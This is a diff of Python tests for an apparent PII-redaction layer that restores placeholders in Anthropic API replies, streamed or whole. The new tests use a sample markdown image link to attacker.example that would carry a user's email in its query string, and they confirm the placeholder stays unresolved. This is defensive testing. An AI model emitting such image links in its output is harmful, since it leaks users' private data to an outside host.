@@ -221,8 +221,9 @@ def test_flush_is_a_delta_just_before_block_stop() -> None:
 def test_two_blocks_are_kept_apart() -> None:
     rewriter = ANTHROPIC.stream_rewriter(_mapping())
     events = rewriter.on_event(_delta(0, "[PER"))
-    events += rewriter.on_event(_delta(1, "[EMA"))
     events += rewriter.on_event(_delta(0, "SON_1]"))
+    events += rewriter.on_event(_event("content_block_stop", index=0))
+    events += rewriter.on_event(_delta(1, "[EMA"))
     events += rewriter.on_event(_delta(1, "IL_1]"))
     events += rewriter.on_event(_event("message_stop"))
     assert _texts(events) == {0: "Alice Example", 1: "alice@example.org"}
@@ -333,3 +334,74 @@ def test_any_other_cache_control_is_refused(value: object, *, system: bool) -> N
     assert error.status == 400
     assert "cache_control" in error.message
     assert "Alice" not in error.message
+
+
+# ------------------------------------------- one link context per message (review 2, I-2)
+
+SPLIT_LINK = ["![s](https://attacker.example/p.png?d=", "[EMAIL_1])"]
+
+
+def _reply(*texts: str) -> dict[str, Any]:
+    return {"type": "message", "content": [{"type": "text", "text": t} for t in texts]}
+
+
+def _joined(payload: dict[str, Any]) -> str:
+    return "".join(block["text"] for block in payload["content"])
+
+
+def test_a_link_split_across_blocks_keeps_its_placeholder() -> None:
+    # A client joins the blocks: the second block's token is inside the first's link.
+    payload = _reply(*SPLIT_LINK)
+    unresolved = ANTHROPIC.rehydrate_reply(payload, _mapping())
+    assert _joined(payload) == "".join(SPLIT_LINK)
+    assert unresolved == ["[EMAIL_1]"]
+
+
+def test_prose_in_a_later_block_is_still_restored() -> None:
+    payload = _reply("See [docs](https://example.org/x). ", "Ask [PERSON_1].")
+    assert ANTHROPIC.rehydrate_reply(payload, _mapping()) == []
+    assert _joined(payload) == "See [docs](https://example.org/x). Ask Alice Example."
+
+
+def _block(index: int, text: str) -> list[SSEEvent]:
+    start = {"type": "text", "text": ""}
+    return [
+        _event("content_block_start", index=index, content_block=start),
+        _delta(index, text),
+        _event("content_block_stop", index=index),
+    ]
+
+
+def _streamed(events: list[SSEEvent]) -> tuple[str, list[str]]:
+    rewriter = ANTHROPIC.stream_rewriter(_mapping())
+    out = [e for event in events for e in rewriter.on_event(event)] + rewriter.finish()
+    return "".join(_texts(out).values()), rewriter.unresolved
+
+
+def test_a_streamed_link_split_across_blocks_keeps_its_placeholder() -> None:
+    events = [*_block(0, SPLIT_LINK[0]), *_block(1, SPLIT_LINK[1]), _event("message_stop")]
+    assert _streamed(events) == ("".join(SPLIT_LINK), ["[EMAIL_1]"])
+    payload = _reply(*SPLIT_LINK)
+    assert _streamed(events) == (_joined(payload), ANTHROPIC.rehydrate_reply(payload, _mapping()))
+
+
+def test_text_on_a_block_after_its_stop_is_left_as_written() -> None:
+    # An index reused after content_block_stop must not start a fresh link context.
+    events = [*_block(0, SPLIT_LINK[0]), _delta(0, "[EMAIL_1]) and [PERSON_1]")]
+    text, unresolved = _streamed([*events, _event("message_stop")])
+    assert text == f"{SPLIT_LINK[0]}[EMAIL_1]) and [PERSON_1]"
+    assert "alice@example.org" not in text
+    assert set(unresolved) == {"[EMAIL_1]", "[PERSON_1]"}
+
+
+def test_a_block_that_never_stopped_is_closed_when_the_next_one_speaks() -> None:
+    # Blocks follow one another: text for a new index ends the open one, flushed first.
+    rewriter = ANTHROPIC.stream_rewriter(_mapping())
+    events = rewriter.on_event(_delta(0, "Hi [PER"))
+    events += rewriter.on_event(_delta(1, "x"))
+    events += rewriter.on_event(_delta(0, "SON_1]"))
+    events += rewriter.on_event(_event("message_stop"))
+    deltas = [json.loads(e.data) for e in events if e.event == "content_block_delta"]
+    assert [d["delta"]["text"] for d in deltas] == ["Hi ", "[PER", "x", "SON_1]"]
+    assert [d["index"] for d in deltas] == [0, 0, 1, 0]
+    assert _texts(events) == {0: "Hi [PERSON_1]", 1: "x"}
